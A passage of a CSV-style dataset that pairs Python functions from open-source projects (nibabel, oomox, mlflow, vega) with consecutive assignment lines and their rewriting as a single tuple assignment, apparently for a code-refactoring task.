        rel_thresh = ulp(scaling_type(1))
    test_vals = (abs_err <= exp_abs_err) | (rel_err <= rel_thresh)
    this_test = np.all(test_vals)
    if DEBUG:
        abs_fails = (abs_err > exp_abs_err)
        rel_fails = (rel_err > rel_thresh)
        all_fails = abs_fails & rel_fails
        if np.any(rel_fails):
            abs_mx_e = abs_err[rel_fails].max()
            exp_abs_mx_e = exp_abs_err[rel_fails].max()
        else:
            abs_mx_e = None
            exp_abs_mx_e = None
        if np.any(abs_fails):
            rel_mx_e = rel_err[abs_fails].max()
        else:
            rel_mx_e = None
        print((test_id,
               np.dtype(in_type).str,
               np.dtype(out_type).str,
               exp_abs_mx_e,
               abs_mx_e,
               rel_thresh,
               rel_mx_e,
               slope, inter))
        # To help debugging failures with --pdb-failure
        np.nonzero(all_fails)
    assert this_test","rel_err = np.abs(top / arr)
abs_err = np.abs(top)","rel_err , abs_err  = np.abs(top / arr), np.abs(top)"
nibabel,https://github.com/nipy/nibabel/tree/master/nibabel/tests/test_round_trip.py,,check_arr$123,"def check_arr(test_id, V_in, in_type, out_type, scaling_type):
    arr, arr_dash, slope, inter = check_params(V_in, in_type, out_type)
    if arr_dash is None:
        # Scaling causes a header or writer error
        return
    nzs = arr != 0  # avoid divide by zero error
    if not np.any(nzs):
        if DEBUG:
            raise ValueError('Array all zero')
        return
    arr = arr[nzs]
    arr_dash_L = arr_dash.astype(BIG_FLOAT)[nzs]
    top = arr - arr_dash_L
    if not np.any(top != 0):
        return
    rel_err = np.abs(top / arr)
    abs_err = np.abs(top)
    if slope == 1:  # integers output, offset only scaling
        if {in_type, out_type} == {np.int64, np.uint64}:
            # Scaling to or from 64 bit ints can go outside range of continuous
            # integers for float64 and thus lose precision; take this into
            # account
            A = arr.astype(float)
            Ai = A - inter
            ulps = [big_bad_ulp(A), big_bad_ulp(Ai)]
            exp_abs_err = np.max(ulps, axis=0)
        else:  # floats can give full precision - no error!
            exp_abs_err = np.zeros_like(abs_err)
        rel_thresh = 0
    else:
        # Error from integer rounding
        inting_err = np.abs(scaling_type(slope) / 2)
        inting_err = inting_err + ulp(inting_err)
        # Error from calculation of inter
        inter_err = ulp(scaling_type(inter))
        # Max abs error from floating point
        with np.errstate(over='ignore'):
            Ai = arr - scaling_type(inter)
        Ais = Ai / scaling_type(slope)
        exp_abs_err = inting_err + inter_err + (
            big_bad_ulp(Ai) + big_bad_ulp(Ais))
        # Relative scaling error from calculation of slope
        # This threshold needs to be 2 x larger on windows 32 bit and PPC for
        # some reason
        rel_thresh = ulp(scaling_type(1))
    test_vals = (abs_err <= exp_abs_err) | (rel_err <= rel_thresh)
    this_test = np.all(test_vals)
    if DEBUG:
        abs_fails = (abs_err > exp_abs_err)
        rel_fails = (rel_err > rel_thresh)
        all_fails = abs_fails & rel_fails
        if np.any(rel_fails):
            abs_mx_e = abs_err[rel_fails].max()
            exp_abs_mx_e = exp_abs_err[rel_fails].max()
        else:
            abs_mx_e = None
            exp_abs_mx_e = None
        if np.any(abs_fails):
            rel_mx_e = rel_err[abs_fails].max()
        else:
            rel_mx_e = None
        print((test_id,
               np.dtype(in_type).str,
               np.dtype(out_type).str,
               exp_abs_mx_e,
               abs_mx_e,
               rel_thresh,
               rel_mx_e,
               slope, inter))
        # To help debugging failures with --pdb-failure
        np.nonzero(all_fails)
    assert this_test","abs_fails = abs_err > exp_abs_err
rel_fails = rel_err > rel_thresh","abs_fails , rel_fails  = abs_err > exp_abs_err, rel_err > rel_thresh"
nibabel,https://github.com/nipy/nibabel/tree/master/nibabel/tests/test_round_trip.py,,check_arr$123,"def check_arr(test_id, V_in, in_type, out_type, scaling_type):
    arr, arr_dash, slope, inter = check_params(V_in, in_type, out_type)
    if arr_dash is None:
        # Scaling causes a header or writer error
        return
    nzs = arr != 0  # avoid divide by zero error
    if not np.any(nzs):
        if DEBUG:
            raise ValueError('Array all zero')
        return
    arr = arr[nzs]
    arr_dash_L = arr_dash.astype(BIG_FLOAT)[nzs]
    top = arr - arr_dash_L
    if not np.any(top != 0):
        return
    rel_err = np.abs(top / arr)
    abs_err = np.abs(top)
    if slope == 1:  # integers output, offset only scaling
        if {in_type, out_type} == {np.int64, np.uint64}:
            # Scaling to or from 64 bit ints can go outside range of continuous
            # integers for float64 and thus lose precision; take this into
            # account
            A = arr.astype(float)
            Ai = A - inter
            ulps = [big_bad_ulp(A), big_bad_ulp(Ai)]
            exp_abs_err = np.max(ulps, axis=0)
        else:  # floats can give full precision - no error!
            exp_abs_err = np.zeros_like(abs_err)
        rel_thresh = 0
    else:
        # Error from integer rounding
        inting_err = np.abs(scaling_type(slope) / 2)
        inting_err = inting_err + ulp(inting_err)
        # Error from calculation of inter
        inter_err = ulp(scaling_type(inter))
        # Max abs error from floating point
        with np.errstate(over='ignore'):
            Ai = arr - scaling_type(inter)
        Ais = Ai / scaling_type(slope)
        exp_abs_err = inting_err + inter_err + (
            big_bad_ulp(Ai) + big_bad_ulp(Ais))
        # Relative scaling error from calculation of slope
        # This threshold needs to be 2 x larger on windows 32 bit and PPC for
        # some reason
        rel_thresh = ulp(scaling_type(1))
    test_vals = (abs_err <= exp_abs_err) | (rel_err <= rel_thresh)
    this_test = np.all(test_vals)
    if DEBUG:
        abs_fails = (abs_err > exp_abs_err)
        rel_fails = (rel_err > rel_thresh)
        all_fails = abs_fails & rel_fails
        if np.any(rel_fails):
            abs_mx_e = abs_err[rel_fails].max()
            exp_abs_mx_e = exp_abs_err[rel_fails].max()
        else:
            abs_mx_e = None
            exp_abs_mx_e = None
        if np.any(abs_fails):
            rel_mx_e = rel_err[abs_fails].max()
        else:
            rel_mx_e = None
        print((test_id,
               np.dtype(in_type).str,
               np.dtype(out_type).str,
               exp_abs_mx_e,
               abs_mx_e,
               rel_thresh,
               rel_mx_e,
               slope, inter))
        # To help debugging failures with --pdb-failure
        np.nonzero(all_fails)
    assert this_test","abs_mx_e = abs_err[rel_fails].max()
exp_abs_mx_e = exp_abs_err[rel_fails].max()","abs_mx_e , exp_abs_mx_e  = abs_err[rel_fails].max(), exp_abs_err[rel_fails].max()"
oomox,https://github.com/themix-project/oomox/tree/master/oomox_gui/colors_list.py,IntListBoxRow,__init__$176,"def __init__(
            self, display_name, key, callback, colors_list,
            min_value=None, max_value=None
    ):
        min_value = min_value or 0
        max_value = max_value or 20
        super().__init__(
            display_name=display_name,
            key=key,
            callback=callback,
            colors_list=colors_list,
            init_value=0,
            min_value=min_value,
            max_value=max_value,
            step_increment=1,
            page_increment=10,
            page_size=0
        )","min_value = min_value or 0
max_value = max_value or 20","min_value , max_value  = min_value or 0, max_value or 20"
mlflow,https://github.com/mlflow/mlflow/tree/master/mlflow/types/utils.py,,_infer_pandas_column$206,"def _infer_pandas_column(col: pd.Series) -> DataType:
    if not isinstance(col, pd.Series):
        raise TypeError(""Expected pandas.Series, got '{}'."".format(type(col)))
    if len(col.values.shape) > 1:
        raise MlflowException(""Expected 1d array, got array with shape {}"".format(col.shape))

    class IsInstanceOrNone:
        def __init__(self, *args):
            self.classes = args
            self.seen_instances = 0

        def __call__(self, x):
            if x is None:
                return True
            elif any(isinstance(x, c) for c in self.classes):
                self.seen_instances += 1
                return True
            else:
                return False

    if col.dtype.kind == ""O"":
        col = col.infer_objects()
    if col.dtype.kind == ""O"":
        # NB: Objects can be either binary or string. Pandas may consider binary data to be a string
        # so we need to check for binary first.
        is_binary_test = IsInstanceOrNone(bytes, bytearray)
        if all(map(is_binary_test, col)) and is_binary_test.seen_instances > 0:
            return DataType.binary
        elif pd.api.types.is_string_dtype(col):
            return DataType.string
        else:
            raise MlflowException(
                ""Unable to map 'object' type to MLflow DataType. object can""
                ""be mapped iff all values have identical data type which is one ""
                ""of (string, (bytes or byterray),  int, float).""
            )
    else:
        # NB: The following works for numpy types as well as pandas extension types.
        return _infer_numpy_dtype(col.dtype)","self.classes = args
self.seen_instances = 0","self.classes , self.seen_instances  = args, 0"
vega,https://github.com/huawei-noah/vega/tree/master/vega/datasets/common/auto_lane_datasets.py,AutoLaneDataset,prepare_test_img$201,"def prepare_test_img(self, idx):
        """"""Prepare an image for testing.

        :param idx: index
        :type idx: int
        :return: an item of data according to the index
        :rtype: dict
        """"""
        target_pair = self.image_annot_path_pairs[idx]
        image_arr = imread(target_pair['image_path'])
        lane_object = self.read_annot(target_pair['annot_path'])
        whc = get_img_whc(image_arr)
        network_input_image = bgr2rgb(resize_by_wh(img=image_arr, width=512, height=288))
        item = dict(
            net_input_image=imagenet_normalize(img=network_input_image),
            net_input_image_mode='RGB',
            net_input_image_shape=dict(width=512, height=288, channel=3),
            src_image_shape=whc,
            src_image_path=target_pair['image_path'],
            annotation_path=target_pair['annot_path'],
            annotation_src_content=lane_object,
            regression_groundtruth=None,
            classfication_groundtruth=None
        )

        result = dict(image=np.transpose(item['net_input_image'], (2, 0, 1)).astype('float32'),
                      net_input_image_shape=json.dumps(item['net_input_image_shape']),
                      src_image_shape=json.dumps(item['src_image_shape']),
                      annot=json.dumps(item['annotation_src_content']),
                      src_image_path=item['src_image_path'],
                      annotation_path=item['annotation_path'])

        return result","lane_object = self.read_annot(target_pair['annot_path'])
whc = get_img_whc(image_arr)
network_input_image = bgr2rgb(resize_by_wh(img=image_arr, width=512, height=288))","lane_object , whc , network_input_image  = self.read_annot(target_pair['annot_path']), get_img_whc(image_arr), bgr2rgb(resize_by_wh(img=image_arr, width=512, height=288))"
